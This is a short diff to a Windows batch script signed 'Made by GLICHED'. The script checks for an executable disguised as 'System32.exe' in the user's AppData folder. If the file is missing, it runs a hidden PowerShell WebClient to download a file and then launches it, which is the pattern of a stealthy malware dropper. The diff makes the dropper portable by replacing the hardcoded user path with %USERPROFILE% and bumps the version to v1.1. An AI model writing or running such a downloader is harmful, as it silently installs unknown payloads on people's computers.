@@ -1,5 +1,5 @@
 @echo off
-set FILE="C:\Users\GLICHED\AppData\Roaming\Windows\System32.exe"
+set FILE="%USERPROFILE%\AppData\Roaming\Windows\System32.exe"
 if exist %FILE% (
     exit /b
 )
@@ -21,4 +21,4 @@ powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile
 start "" "%TARGET_FILE%"
 exit
 :: Made by GLICHED 
-:: v1
+:: v1.1
